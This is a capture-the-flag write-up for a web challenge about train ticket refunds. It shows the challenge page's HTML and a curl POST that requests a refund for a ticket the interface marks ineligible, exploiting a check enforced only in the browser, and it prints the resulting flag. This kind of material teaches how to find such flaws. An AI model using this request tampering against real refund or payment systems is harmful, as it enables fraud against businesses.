# No refund

Category: Web

## Description

> You had a train service cancelled and you are entitled to a full refund. However the train companies website is not allowing you to. Can you still get it?

A website was attached.

## Solution

The attached website contained a user interface for requesting refunds for a train ticket:

```html
<h1>🚆 Train Ticket Refund 🚆</h1>

  <h2>Your tickets:</h2>

  
  <div class="ticket-container">
    <div class="ticket" id="85cc3c46f7657a8a962d3b2b299d9be8">
      <p><strong>From:</strong> Flag City</p>
      <p><strong>To:</strong> Sunshine City</p>
      <p><strong>Date:</strong> 2024-10-06</p>
      <p><strong>Time:</strong> 10:30 AM</p>
    </div>
    
    <div class="norefund">
      <h4>Not eligable for refund.</h4>
    </div>
    
  </div>
  <br>
  
  <div class="ticket-container">
    <div class="ticket" id="2355e4cf000965ac1fe9f0bc2624203e">
      <p><strong>From:</strong> Flag City</p>
      <p><strong>To:</strong> Sunshine City</p>
      <p><strong>Date:</strong> 2024-10-09</p>
      <p><strong>Time:</strong> 11:30 AM</p>
    </div>
    
    <div class="refund">
      <form action="/refund" method="post">
        Refund reason:
        <select name="reason" required>
          <option value="delay">Delay >1 hour</option>
          <option value="cancel">Cancellation</option>
          <option hidden disabled selected value>--</option>
        </select><br><br>
        <input type="text" name="ticket_id" value="2355e4cf000965ac1fe9f0bc2624203e" hidden="true"></input>
        <input type="submit" value="Submit for refund">
      </form>
    </div>
    
  </div>
  <br>
  
  <div class="ticket-container">
    <div class="ticket" id="17b26db02b82397d54201f886d085e58">
      <p><strong>From:</strong> Sunshine City</p>
      <p><strong>To:</strong> Flag City</p>
      <p><strong>Date:</strong> 2024-10-14</p>
      <p><strong>Time:</strong> 06:25 PM</p>
    </div>
    
    <div class="refund">
      <form action="/refund" method="post">
        Refund reason:
        <select name="reason" required>
          <option value="delay">Delay >1 hour</option>
          <option value="cancel">Cancellation</option>
          <option hidden disabled selected value>--</option>
        </select><br><br>
        <input type="text" name="ticket_id" value="17b26db02b82397d54201f886d085e58" hidden="true"></input>
        <input type="submit" value="Submit for refund">
      </form>
    </div>
    
  </div>
```

While the UI offers the ability to request a refund for the last two tickets by submitting the
form, the first ticket doesn't contain a form and states that the ticket is "not eligible for refund".

However, since the ticket ID is visible from the HTML, we can try to spoof the refund request
ourselves:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/No_refund]
└─$ curl -s 'https://no-refund-web.2024-bq.ctfcompetition.com/refund' -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-raw 'reason=delay&ticket_id=85cc3c46f7657a8a962d3b2b299d9be8' | grep CTF
<h2 style="width:50%;margin:auto;">Your ticket will be refundend within 3-5 business days, confirmation code: CTF{fr0n73nd5_c4n7_570p_m3} </h2>
```

The flag: `CTF{fr0n73nd5_c4n7_570p_m3}`